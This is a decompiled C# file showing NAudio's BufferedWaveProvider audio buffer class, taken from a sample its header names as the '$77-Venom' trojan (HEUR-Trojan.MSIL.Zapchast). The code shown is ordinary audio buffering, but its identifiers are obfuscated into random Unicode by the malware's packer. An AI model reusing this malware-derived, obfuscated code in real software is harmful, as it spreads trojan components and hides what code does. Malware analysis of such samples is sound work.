// Decompiled with JetBrains decompiler
// Type: NAudio.Wave.BufferedWaveProvider
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;

namespace NAudio.Wave
{
  public class BufferedWaveProvider : 벙灘ꩌ\uFFFDິњ晘\uF867ાⴏ䑛멀뀝譝愡埩\u2225똀覉겝
  {
    private 䧏콸馢쟻㘟虎\u293B磟証礧꘡푉Ờ䓉\uE6E5\u260C悲먤䂋ꨪ circularBuffer;
    private readonly \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 waveFormat;

    public BufferedWaveProvider(
      \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 waveFormat)
    {
      this.waveFormat = waveFormat;
      this.BufferLength = waveFormat.AverageBytesPerSecond * 5;
      this.ReadFully = true;
    }

    public bool ReadFully { get; set; }

    public int BufferLength { get; set; }

    public TimeSpan BufferDuration
    {
      get => TimeSpan.FromSeconds((double) this.BufferLength / (double) this.WaveFormat.AverageBytesPerSecond);
      set => this.BufferLength = (int) (value.TotalSeconds * (double) this.WaveFormat.AverageBytesPerSecond);
    }

    public bool DiscardOnBufferOverflow { get; set; }

    public int BufferedBytes => this.circularBuffer != null ? this.circularBuffer.Count : 0;

    public TimeSpan BufferedDuration => TimeSpan.FromSeconds((double) this.BufferedBytes / (double) this.WaveFormat.AverageBytesPerSecond);

    public \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 WaveFormat => this.waveFormat;

    public void AddSamples(byte[] buffer, int offset, int count)
    {
      if (this.circularBuffer == null)
        this.circularBuffer = new 䧏콸馢쟻㘟虎\u293B磟証礧꘡푉Ờ䓉\uE6E5\u260C悲먤䂋ꨪ(this.BufferLength);
      if (this.circularBuffer.ﱛ䗝\uF4EE춊ጵቦ螅\u279Eҩ豞\uE9A3䁇우敾肓䌹ॉ틔\uE598薅(buffer, offset, count) < count && !this.DiscardOnBufferOverflow)
        throw new InvalidOperationException("Buffer full");
    }

    public int Read(byte[] buffer, int offset, int count)
    {
      int num = 0;
      if (this.circularBuffer != null)
        num = this.circularBuffer.ᯇ팤攖ﶰ衢䩇쫑耙\uEE39ꓝ\u0F0A깃ﻝΘ\u299A\uFFFD煉쨳ꦙ\uFFFD(buffer, offset, count);
      if (this.ReadFully && num < count)
      {
        Array.Clear((Array) buffer, offset + num, count - num);
        num = count;
      }
      return num;
    }

    public void ClearBuffer()
    {
      if (this.circularBuffer == null)
        return;
      this.circularBuffer.뾤\uFFFD㫬\uF2EC뫺뻚ﰐ춏耱ꜗᗦ邀빆됥滛뻹马摙뎈付();
    }
  }
}
